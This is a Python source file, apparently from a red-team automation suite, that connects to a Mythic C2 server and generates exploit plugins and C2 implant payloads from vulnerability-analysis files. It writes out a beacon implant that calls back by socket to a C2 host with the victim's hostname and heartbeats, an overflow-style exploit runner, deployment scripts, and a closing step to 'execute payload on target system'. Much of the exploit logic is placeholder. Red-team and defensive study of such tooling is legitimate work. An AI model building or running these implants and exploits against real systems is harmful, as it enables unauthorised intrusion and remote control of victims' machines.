import os
import sys
import json
import requests
import time
import argparse
import base64
import uuid
from datetime import datetime
from pathlib import Path

class MythicConnector:
    """Handles connection and communication with Mythic C2 Framework"""
    
    def __init__(self, mythic_host="http://localhost:7443", username="mythic_admin", password=None):
        self.mythic_host = mythic_host.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification for local instances
        self.auth_token = None
        
    def authenticate(self):
        """Authenticate with Mythic instance"""
        if not self.password:
            print("Warning: No password provided for Mythic authentication")
            return False
            
        try:
            auth_url = f"{self.mythic_host}/auth"
            auth_data = {
                "username": self.username,
                "password": self.password
            }
            
            response = self.session.post(auth_url, json=auth_data, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                self.auth_token = result.get("access_token")
                if self.auth_token:
                    self.session.headers.update({
                        "Authorization": f"Bearer {self.auth_token}"
                    })
                    return True
            
            return False
            
        except Exception as e:
            print(f"Mythic authentication failed: {e}")
            return False
    
    def test_connection(self):
        """Test connection to Mythic instance"""
        try:
            # Try to access the API endpoint
            response = self.session.get(f"{self.mythic_host}/api/v1.4/operations", timeout=5)
            
            if response.status_code == 200:
                return True, "Connected to Mythic successfully"
            elif response.status_code == 401:
                return False, "Authentication required"
            else:
                return False, f"HTTP {response.status_code}: {response.text}"
                
        except requests.exceptions.ConnectionError:
            return False, "Cannot connect to Mythic instance (connection refused)"
        except requests.exceptions.Timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    def create_operation(self, name, description="Auto-generated operation"):
        """Create a new operation in Mythic"""
        try:
            operation_data = {
                "name": name,
                "description": description,
                "complete": False
            }
            
            response = self.session.post(
                f"{self.mythic_host}/api/v1.4/operations",
                json=operation_data,
                timeout=10
            )
            
            if response.status_code == 201:
                operation = response.json()
                return True, operation
            else:
                return False, f"Failed to create operation: {response.text}"
                
        except Exception as e:
            return False, f"Error creating operation: {str(e)}"
    
    def get_payload_types(self):
        """Get available payload types from Mythic"""
        try:
            response = self.session.get(
                f"{self.mythic_host}/api/v1.4/payloadtypes",
                timeout=10
            )
            
            if response.status_code == 200:
                return True, response.json()
            else:
                return False, f"Failed to get payload types: {response.text}"
                
        except Exception as e:
            return False, f"Error getting payload types: {str(e)}"

class MythicPluginGenerator:
    """Generates custom Mythic plugins for discovered vulnerabilities"""
    
    def __init__(self, mythic_connector):
        self.mythic = mythic_connector
        
    def generate_exploit_plugin(self, vulnerability_info, poc_code, binary_path):
        """Generate a custom Mythic plugin for the discovered vulnerability"""
        
        vuln_type = vulnerability_info.get("vulnerability_type", "unknown")
        plugin_name = f"exploit_{vuln_type}_{int(time.time())}"
        
        # Create plugin metadata
        plugin_metadata = {
            "name": plugin_name,
            "description": f"Auto-generated exploit for {vuln_type}",
            "vulnerability_type": vuln_type,
            "target_binary": os.path.basename(binary_path),
            "generated_timestamp": datetime.now().isoformat(),
            "confidence": vulnerability_info.get("confidence", 0),
            "severity": vulnerability_info.get("severity", "Unknown")
        }
        
        # Generate plugin code
        plugin_code = self._create_plugin_code(plugin_name, poc_code, vulnerability_info)
        
        # Create plugin configuration
        plugin_config = self._create_plugin_config(plugin_name, vulnerability_info)
        
        return {
            "metadata": plugin_metadata,
            "code": plugin_code,
            "config": plugin_config,
            "installation_script": self._create_installation_script(plugin_name)
        }
    
    def _create_plugin_code(self, plugin_name, poc_code, vulnerability_info):
        """Create the actual plugin code for Mythic"""
        
        plugin_template = f'''"""
{plugin_name} - Auto-generated Mythic Plugin
Generated by Red Team Automation Suite
Vulnerability: {vulnerability_info.get("vulnerability_type", "unknown")}
"""

import asyncio
import os
import tempfile
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *

class {plugin_name.title().replace('_', '')}Command(CommandBase):
    cmd = "{plugin_name}"
    needs_admin = False
    help_cmd = "Execute auto-generated exploit for {vulnerability_info.get('vulnerability_type', 'unknown')}"
    description = "Automatically generated exploit based on vulnerability analysis"
    version = 1
    author = "@RedTeamAutomationSuite"
    argument_class = {plugin_name.title().replace('_', '')}Arguments
    attackmapping = ["T1055", "T1059"]  # Process Injection, Command and Scripting Interpreter

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        """Execute the vulnerability exploit"""
        
        # Get target information
        target_binary = task.args.get_arg("target")
        if not target_binary:
            task.status = MythicStatus.Error
            task.stderr = "Target binary path required"
            return task
        
        # Generate exploit payload
        payload_content = self._generate_exploit_payload()
        
        # Create temporary file for payload
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.exploit') as f:
            f.write(payload_content)
            payload_path = f.name
        
        try:
            # Execute the exploit
            result = await self._execute_exploit(target_binary, payload_path)
            
            if result["success"]:
                task.status = MythicStatus.Completed
                task.stdout = f"Exploit executed successfully: {{result['output']}}"
            else:
                task.status = MythicStatus.Error
                task.stderr = f"Exploit failed: {{result['error']}}"
                
        except Exception as e:
            task.status = MythicStatus.Error
            task.stderr = f"Exploit execution error: {{str(e)}}"
        finally:
            # Clean up temporary file
            try:
                os.unlink(payload_path)
            except:
                pass
        
        return task
    
    def _generate_exploit_payload(self):
        """Generate the exploit payload based on PoC"""
        
        # Embedded PoC code (simplified for security)
        poc_payload = """
# Auto-generated exploit payload
# Vulnerability: {vulnerability_info.get('vulnerability_type', 'unknown')}

import subprocess
import tempfile
import os

def create_payload():
    # Payload generation logic here
    payload_size = 64  # Extracted from analysis
    payload = b"A" * payload_size + b"\\x42\\x42\\x42\\x42"
    return payload

def execute_exploit(target_binary):
    payload = create_payload()
    
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(payload)
        payload_file = f.name
    
    try:
        result = subprocess.run(
            [target_binary, payload_file],
            capture_output=True,
            timeout=10
        )
        
        return {{
            "exit_code": result.returncode,
            "stdout": result.stdout.decode('utf-8', errors='replace'),
            "stderr": result.stderr.decode('utf-8', errors='replace')
        }}
    finally:
        try:
            os.unlink(payload_file)
        except:
            pass

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        result = execute_exploit(sys.argv[1])
        print(f"Result: {{result}}")
"""
        return poc_payload
    
    async def _execute_exploit(self, target_binary, payload_path):
        """Execute the exploit against the target"""
        try:
            # Execute the embedded exploit logic
            process = await asyncio.create_subprocess_exec(
                "python3", "-c", self._generate_exploit_payload(),
                target_binary,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            return {{
                "success": process.returncode != 0,  # Non-zero often indicates crash (success for exploit)
                "output": stdout.decode('utf-8', errors='replace'),
                "error": stderr.decode('utf-8', errors='replace'),
                "exit_code": process.returncode
            }}
            
        except Exception as e:
            return {{
                "success": False,
                "error": str(e),
                "output": "",
                "exit_code": -1
            }}

class {plugin_name.title().replace('_', '')}Arguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {{
            "target": CommandParameter(
                name="target",
                type=ParameterType.String,
                description="Path to target binary",
                required=True
            )
        }}

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Target binary path required")
        
        # Simple argument parsing - just take the target path
        self.add_arg("target", self.command_line.strip())
'''
        
        return plugin_template
    
    def _create_plugin_config(self, plugin_name, vulnerability_info):
        """Create plugin configuration"""
        return {
            "name": plugin_name,
            "description": f"Auto-generated exploit for {vulnerability_info.get('vulnerability_type')}",
            "supported_os": ["Linux", "Windows", "MacOS"],
            "wrapper": False,
            "supported_wrapper_payload_types": [],
            "mythic_encrypts": True,
            "translation_container": None,
            "agent_type": "agent",
            "agent_icon_path": "agent_functions/browser_scripts/default_agent.svg"
        }
    
    def _create_installation_script(self, plugin_name):
        """Create installation script for the plugin"""
        return f'''#!/bin/bash
# Installation script for {plugin_name}
# Auto-generated by Red Team Automation Suite

echo "Installing {plugin_name} plugin..."

# Create plugin directory
mkdir -p ./Payload_Types/{plugin_name}/agent_code
mkdir -p ./Payload_Types/{plugin_name}/mythic

# Copy plugin files (would be generated separately)
echo "Plugin {plugin_name} structure created"
echo "Manual installation steps:"
echo "1. Copy plugin code to ./Payload_Types/{plugin_name}/"
echo "2. Rebuild Mythic containers: sudo ./mythic-cli mythic start"
echo "3. Plugin will be available in Mythic interface"
'''

class C2PayloadBuilder:
    """Builds C2-compatible payloads from vulnerability analysis"""
    
    def __init__(self, mythic_connector):
        self.mythic = mythic_connector
        
    def create_c2_payload(self, vulnerability_info, binary_analysis, poc_code):
        """Create a C2-deliverable payload"""
        
        vuln_type = vulnerability_info.get("vulnerability_type", "unknown")
        
        # Determine payload strategy based on binary protections
        payload_strategy = self._determine_payload_strategy(binary_analysis)
        
        # Create base payload
        payload_data = {
            "name": f"auto_exploit_{vuln_type}_{int(time.time())}",
            "description": f"Auto-generated payload for {vuln_type}",
            "vulnerability_type": vuln_type,
            "payload_strategy": payload_strategy,
            "binary_protections": self._extract_protections(binary_analysis),
            "delivery_method": self._determine_delivery_method(vulnerability_info),
            "generated_timestamp": datetime.now().isoformat()
        }
        
        # Generate payload code
        payload_code = self._generate_payload_code(vulnerability_info, poc_code, payload_strategy)
        
        # Create deployment script
        deployment_script = self._create_deployment_script(payload_data, payload_code)
        
        return {
            "payload_data": payload_data,
            "payload_code": payload_code,
            "deployment_script": deployment_script,
            "c2_configuration": self._create_c2_config(payload_data)
        }
    
    def _determine_payload_strategy(self, binary_analysis):
        """Determine the best payload strategy based on protections"""
        
        if not binary_analysis:
            return "direct_exploitation"
        
        protections = binary_analysis.get("exploit_mitigation_summary", {})
        protection_level = protections.get("protection_level", "Unknown")
        
        if protection_level == "Low":
            return "direct_shellcode"
        elif protection_level == "Medium":
            return "rop_chain"
        else:
            return "advanced_bypass"
    
    def _extract_protections(self, binary_analysis):
        """Extract protection information for payload generation"""
        if not binary_analysis:
            return {}
        
        return {
            "aslr": binary_analysis.get("aslr_system", {}).get("enabled", False),
            "nx": binary_analysis.get("nx_bit", {}).get("enabled", False),
            "pie": binary_analysis.get("pie", {}).get("enabled", False),
            "canaries": binary_analysis.get("stack_canaries", {}).get("enabled", False),
            "relro": binary_analysis.get("relro", {}).get("status", "Unknown")
        }
    
    def _determine_delivery_method(self, vulnerability_info):
        """Determine how to deliver the payload"""
        
        vuln_type = vulnerability_info.get("vulnerability_type", "unknown")
        
        if vuln_type in ["command_injection", "sql_injection"]:
            return "injection_based"
        elif vuln_type in ["stack_buffer_overflow", "heap_buffer_overflow"]:
            return "memory_corruption"
        elif vuln_type == "format_string":
            return "format_string_exploitation"
        else:
            return "file_based"
    
    def _generate_payload_code(self, vulnerability_info, poc_code, strategy):
        """Generate the actual payload code"""
        
        payload_template = f'''#!/usr/bin/env python3
"""
Auto-generated C2 Payload
Vulnerability: {vulnerability_info.get("vulnerability_type", "unknown")}
Strategy: {strategy}
Generated: {datetime.now().isoformat()}
"""

import socket
import subprocess
import os
import base64
import time

class C2Payload:
    def __init__(self, c2_host="127.0.0.1", c2_port=8080):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.session_id = self._generate_session_id()
    
    def _generate_session_id(self):
        """Generate unique session ID"""
        import uuid
        return str(uuid.uuid4())[:8]
    
    def connect_to_c2(self):
        """Establish connection to C2 server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.c2_host, self.c2_port))
            
            # Send initial beacon
            beacon = {{
                "session_id": self.session_id,
                "type": "initial_beacon",
                "vulnerability": "{vulnerability_info.get('vulnerability_type', 'unknown')}",
                "hostname": os.uname().nodename if hasattr(os, 'uname') else 'unknown'
            }}
            
            self.send_data(beacon)
            return True
            
        except Exception as e:
            return False
    
    def send_data(self, data):
        """Send data to C2 server"""
        try:
            import json
            message = json.dumps(data) + "\\n"
            self.sock.send(message.encode())
        except:
            pass
    
    def execute_payload(self):
        """Execute the exploitation payload"""
        
        # This would contain the actual exploitation logic
        # Based on the PoC code and vulnerability type
        
        result = {{
            "status": "exploited",
            "method": "{strategy}",
            "vulnerability": "{vulnerability_info.get('vulnerability_type', 'unknown')}",
            "timestamp": time.time()
        }}
        
        return result
    
    def main_loop(self):
        """Main C2 communication loop"""
        if not self.connect_to_c2():
            return
        
        # Execute initial payload
        result = self.execute_payload()
        self.send_data(result)
        
        # Command loop (simplified)
        while True:
            try:
                # This would handle C2 commands
                time.sleep(5)
                
                # Send heartbeat
                heartbeat = {{
                    "session_id": self.session_id,
                    "type": "heartbeat",
                    "timestamp": time.time()
                }}
                self.send_data(heartbeat)
                
            except KeyboardInterrupt:
                break
            except:
                break

if __name__ == "__main__":
    payload = C2Payload()
    payload.main_loop()
'''
        
        return payload_template
    
    def _create_deployment_script(self, payload_data, payload_code):
        """Create deployment script for the payload"""
        
        return f'''#!/bin/bash
# C2 Payload Deployment Script
# Auto-generated by Red Team Automation Suite

PAYLOAD_NAME="{payload_data['name']}"
VULNERABILITY="{payload_data['vulnerability_type']}"

echo "Deploying C2 payload: $PAYLOAD_NAME"
echo "Vulnerability type: $VULNERABILITY"

# Create payload file
cat > $PAYLOAD_NAME.py << 'EOF'
{payload_code}
EOF

chmod +x $PAYLOAD_NAME.py

echo "Payload deployed: $PAYLOAD_NAME.py"
echo "Execute with: python3 $PAYLOAD_NAME.py"
echo ""
echo "C2 Configuration needed:"
echo "  - C2 Host: 127.0.0.1"
echo "  - C2 Port: 8080"
echo "  - Vulnerability: $VULNERABILITY"
'''
    
    def _create_c2_config(self, payload_data):
        """Create C2 configuration"""
        return {
            "payload_name": payload_data["name"],
            "listener_config": {
                "host": "0.0.0.0",
                "port": 8080,
                "protocol": "tcp"
            },
            "payload_config": {
                "vulnerability_type": payload_data["vulnerability_type"],
                "callback_interval": 5,
                "max_retries": 3
            },
            "operational_config": {
                "auto_execute": True,
                "persistence": False,
                "stealth_mode": False
            }
        }

def main():
    parser = argparse.ArgumentParser(description="Mythic C2 Framework Integration")
    parser.add_argument("-v", "--vulnerability-analysis", default="llm_analysis.json",
                        help="Path to vulnerability analysis JSON")
    parser.add_argument("-b", "--binary-analysis", default="binary_analysis.json",
                        help="Path to binary analysis JSON")
    parser.add_argument("-t", "--target-binary", required=True,
                        help="Path to target binary")
    parser.add_argument("-o", "--output-dir", default="mythic_output",
                        help="Output directory for generated artifacts")
    parser.add_argument("--mythic-host", default="http://localhost:7443",
                        help="Mythic server URL")
    parser.add_argument("--mythic-user", default="mythic_admin",
                        help="Mythic username")
    parser.add_argument("--mythic-password",
                        help="Mythic password")
    
    args = parser.parse_args()
    
    print("Mythic C2 Framework Integration")
    print("=" * 40)
    print(f"Target: {args.target_binary}")
    print(f"Output: {args.output_dir}")
    
    # Create output directory
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Load analysis data
    vulnerability_info = {}
    binary_analysis = {}
    poc_code = ""
    
    if os.path.exists(args.vulnerability_analysis):
        with open(args.vulnerability_analysis, 'r') as f:
            vuln_data = json.load(f)
            vulnerability_info = vuln_data.get("vulnerability_classification", {})
            poc_data = vuln_data.get("dynamic_poc_generation", {})
            poc_code = poc_data.get("poc_code", "")
        print(f"Loaded vulnerability analysis: {args.vulnerability_analysis}")
    
    if os.path.exists(args.binary_analysis):
        with open(args.binary_analysis, 'r') as f:
            binary_analysis = json.load(f)
        print(f"Loaded binary analysis: {args.binary_analysis}")
    
    # Initialize Mythic connector
    mythic = MythicConnector(
        mythic_host=args.mythic_host,
        username=args.mythic_user,
        password=args.mythic_password
    )
    
    # Test connection
    print("\nTesting Mythic connection...")
    success, message = mythic.test_connection()
    if success:
        print(f"Connection successful: {message}")
    else:
        print(f"Connection failed: {message}")
        print("Continuing with offline plugin generation...")
    
    # Generate Mythic plugin
    print("\nGenerating Mythic plugin...")
    plugin_generator = MythicPluginGenerator(mythic)
    plugin = plugin_generator.generate_exploit_plugin(
        vulnerability_info, poc_code, args.target_binary
    )
    
    # Save plugin files
    plugin_dir = os.path.join(args.output_dir, "mythic_plugin")
    os.makedirs(plugin_dir, exist_ok=True)
    
    with open(os.path.join(plugin_dir, "plugin_metadata.json"), 'w') as f:
        json.dump(plugin["metadata"], f, indent=2)
    
    with open(os.path.join(plugin_dir, "plugin_code.py"), 'w') as f:
        f.write(plugin["code"])
    
    with open(os.path.join(plugin_dir, "install.sh"), 'w') as f:
        f.write(plugin["installation_script"])
    
    os.chmod(os.path.join(plugin_dir, "install.sh"), 0o755)
    
    # Generate C2 payload
    print("Generating C2 payload...")
    payload_builder = C2PayloadBuilder(mythic)
    payload = payload_builder.create_c2_payload(
        vulnerability_info, binary_analysis, poc_code
    )
    
    # Save payload files
    payload_dir = os.path.join(args.output_dir, "c2_payload")
    os.makedirs(payload_dir, exist_ok=True)
    
    with open(os.path.join(payload_dir, "payload_config.json"), 'w') as f:
        json.dump(payload["payload_data"], f, indent=2)
    
    with open(os.path.join(payload_dir, "payload.py"), 'w') as f:
        f.write(payload["payload_code"])
    
    with open(os.path.join(payload_dir, "deploy.sh"), 'w') as f:
        f.write(payload["deployment_script"])
    
    with open(os.path.join(payload_dir, "c2_config.json"), 'w') as f:
        json.dump(payload["c2_configuration"], f, indent=2)
    
    os.chmod(os.path.join(payload_dir, "deploy.sh"), 0o755)
    os.chmod(os.path.join(payload_dir, "payload.py"), 0o755)
    
    print("\nC2 Integration Complete!")
    print("=" * 40)
    print(f"Generated artifacts:")
    print(f"  Mythic Plugin: {plugin_dir}/")
    print(f"  C2 Payload: {payload_dir}/")
    print(f"  Plugin Name: {plugin['metadata']['name']}")
    print(f"  Vulnerability: {vulnerability_info.get('vulnerability_type', 'unknown')}")
    print()
    print("Next steps:")
    print(f"1. Install Mythic plugin: cd {plugin_dir} && ./install.sh")
    print(f"2. Deploy C2 payload: cd {payload_dir} && ./deploy.sh")
    print("3. Set up Mythic listener on port 8080")
    print("4. Execute payload on target system")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())